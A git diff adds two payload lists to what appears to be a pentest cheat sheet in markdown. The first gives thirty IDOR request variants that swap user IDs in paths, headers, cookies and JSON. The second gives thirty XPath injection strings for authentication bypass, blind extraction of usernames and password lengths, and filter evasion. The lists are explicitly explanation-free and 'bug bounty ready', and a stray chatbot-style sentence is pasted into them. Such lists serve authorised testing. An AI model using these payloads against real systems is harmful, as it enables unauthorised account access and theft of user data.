@@ -5521,6 +5521,185 @@ Insecure Direct Object References (IDOR) is a security vulnerability that occurs
 - `https://example.com/profile?user_id=123:`c
 ---
 
+### 1. Basic IDOR via Numeric ID
+
+```
+/api/user?id=2
+```
+
+### 2. IDOR via Incremental ID
+
+```
+/order/1002
+```
+
+### 3. IDOR via Decremental ID
+
+```
+/order/998
+```
+
+### 4. IDOR via UUID Replacement
+
+```
+/api/user/550e8400-e29b-41d4-a716-446655440000
+```
+
+### 5. IDOR via Email Parameter
+
+```
+/profile?email=victim@target.com
+```
+
+### 6. IDOR via Username
+
+```
+/account?username=admin
+```
+
+### 7. IDOR via POST Body
+
+```
+user_id=2
+```
+
+### 8. IDOR via JSON Body
+
+```
+{"userId":2}
+```
+
+### 9. IDOR via Cookie Value
+
+```
+Cookie: user_id=2
+```
+
+### 10. IDOR via Header Injection
+
+```
+X-User-Id: 2
+```
+
+### 11. IDOR via JWT Claim Manipulation
+
+```
+"user_id":2
+```
+
+### 12. IDOR via Base64 Encoded ID
+
+```
+id=Mg==
+```
+
+### 13. IDOR via URL Encoding
+
+```
+id=%32
+```
+
+### 14. IDOR via Parameter Pollution
+
+```
+id=1&id=2
+```
+
+### 15. IDOR via Array Parameter
+
+```
+id[]=1&id[]=2
+```
+
+### 16. IDOR via Method Change
+
+```
+PUT /api/user/2
+```
+
+### 17. IDOR via HTTP Verb Tampering
+
+```
+DELETE /api/account/2
+```
+
+### 18. IDOR via Mass Assignment
+
+```
+{"role":"admin","user_id":2}
+```
+
+### 19. IDOR via File Download
+
+```
+/download?file_id=2
+```
+
+### 20. IDOR via Invoice Access
+
+```
+/invoice/20240002.pdf
+```
+
+### 21. IDOR via Order History
+
+```
+/orders?user_id=2
+```
+
+### 22. IDOR via GraphQL
+
+```
+{"query":"{user(id:2){email}}"}
+```
+
+### 23. IDOR via Mobile API
+
+```
+/v1/profile/2
+```
+
+### 24. IDOR via Referer Header
+
+```
+Referer: https://target.com/user/2
+```
+
+### 25. IDOR via Nested JSON Object
+
+```
+{"account":{"id":2}}
+```
+
+### 26. IDOR via Wildcard Parameter
+
+```
+user_id=*
+```
+
+### 27. IDOR via Negative ID
+
+```
+id=-1
+```
+
+### 28. IDOR via Large Integer
+
+```
+id=9999999
+```
+
+### 29. IDOR via Null Value
+
+```
+id=null
+```
+
+### 30. IDOR via Session Fixation
+
+```
+session_user_id=2
+```
 ## XPATH Injection
 
 ### Example Payloads:
@@ -5541,7 +5720,191 @@ and string-length(account)=SIZE_INT
 - [xpath-blind-explorer](https://github.com/micsoftvn/xpath-blind-explorer)
 - [XmlChor](https://github.com/Harshal35/XMLCHOR)
 
----
+Below is **same strict format** — **ONLY testcase names with payloads**, including **XPath Injection bypass techniques**.
+(No explanations. Pentest / Bug bounty / GitHub ready.)
+
+## XPath Injection – Test Cases & Payloads
+
+### 1. Basic XPath Injection
+
+```
+' or '1'='1
+```
+
+### 2. Double Quote Injection
+
+```
+" or "1"="1
+```
+
+### 3. Comment Bypass
+
+```
+' or '1'='1' --
+```
+
+### 4. XPath Always True Condition
+
+```
+' or true() or '
+```
+
+### 5. XPath Always False Test
+
+```
+' and false() and '
+```
+
+### 6. Bypass Authentication
+
+```
+' or position()=1 or '
+```
+
+### 7. Node Count Enumeration
+
+```
+' or count(//user)=1 or '
+```
+
+### 8. Username Extraction
+
+```
+' or substring(//user[1]/username,1,1)='a' or '
+```
+
+### 9. Password Length Enumeration
+
+```
+' or string-length(//user[1]/password)=8 or '
+```
+
+### 10. Boolean-Based Blind XPath
+
+```
+' or //user[username/text()='admin'] or '
+```
+
+### 11. Case-Insensitive Bypass
+
+```
+' or translate(username,'ABCDEFGHIJKLMNOPQRSTUVWXYZ','abcdefghijklmnopqrstuvwxyz')='admin' or '
+```
+
+### 12. Whitespace Bypass
+
+```
+'	or	'1'='1
+```
+
+### 13. Parenthesis Bypass
+
+```
+') or ('1'='1
+```
+
+### 14. Numeric Comparison Injection
+
+```
+' or 1=1 or '
+```
+
+### 15. XPath Union Bypass
+
+```
+' | //user | '
+```
+
+### 16. Filter Evasion via concat()
+
+```
+' or concat('a','d','m','i','n')='admin' or '
+```
+
+### 17. Filter Evasion via contains()
+
+```
+' or contains(username,'adm') or '
+```
+
+### 18. Starts-With Function Abuse
+
+```
+' or starts-with(username,'ad') or '
+```
+
+### 19. Ends-With Function Abuse
+
+```
+' or substring(username,string-length(username)-4)='admin' or '
+```
+
+### 20. Comment Function Bypass
+
+```
+' or comment() or '
+```
+
+### 21. Wildcard Node Selection
+
+```
+' or //* or '
+```
+
+### 22. Attribute-Based Injection
+
+```
+' or //@* or '
+```
+
+### 23. XPath Injection via Numeric Field
+
+```
+1 or 1=1
+```
+
+### 24. XPath Injection via XML Attribute
+
+```
+" or @role='admin' or "
+```
+
+### 25. Encoding Bypass
+
+```
+%27%20or%20%271%27%3D%271
+```
+
+### 26. Double Encoding Bypass
+
+```
+%2527%2520or%2520%25271%2527%253D%25271
+```
+
+### 27. Newline Injection
+
+```
+' or
+'1'='1
+```
+
+### 28. XPath Injection via POST Body
+
+```
+username=' or '1'='1
+```
+
+### 29. XPath Injection via JSON
+
+```
+{"username":"' or '1'='1"}
+```
+
+### 30. Blind Time-Based XPath (Heavy Query)
+
+```
+' or count(//node[count(//node)>100000]) or '
+```
 
 ## XSLT Injection
 
